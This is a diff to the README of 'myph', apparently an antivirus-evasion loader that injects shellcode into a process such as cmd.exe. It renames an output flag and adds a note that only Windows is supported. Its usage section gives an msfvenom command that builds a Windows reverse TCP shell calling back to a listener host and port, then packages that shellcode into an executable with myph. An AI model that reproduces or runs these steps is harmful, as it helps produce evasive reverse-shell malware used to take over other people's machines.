@@ -46,13 +46,15 @@ Flags:
   -h, --help                 help for myph
   -k, --key string           encryption key, auto-generated if empty. (if used by --encryption)
   -o, --os string            OS compilation target (default "windows")
-  -f, --outdir string        output directory (default "myph-out")
+  -f, --out string           output name (default "myph-out")
   -p, --process string       target process to inject shellcode to (default "cmd.exe")
   -s, --shellcode string     shellcode path (default "msf.raw")
   -v, --version              version for myph
 ```
 
 This tool uses the CRT method. If you don't know what that is, go check out [this repository](https://github.com/CMEPW/BypassAV) :)~
+
+> Altough there is an OS version, Linux or MacOS are not supported !
 
 Generate a payload like so:
 
@@ -61,10 +63,10 @@ Generate a payload like so:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=1234 -f raw -o msf.raw
 
 # run myph (--shellcode is not mandatory here because we use the default value)
-./myph --shellcode msf.raw --outdir something
+./myph --shellcode msf.raw --out something
 
 # you should find your payload here
-file ./something/payload.exe
+file ./something.exe
 ```
 
 #### Using docker
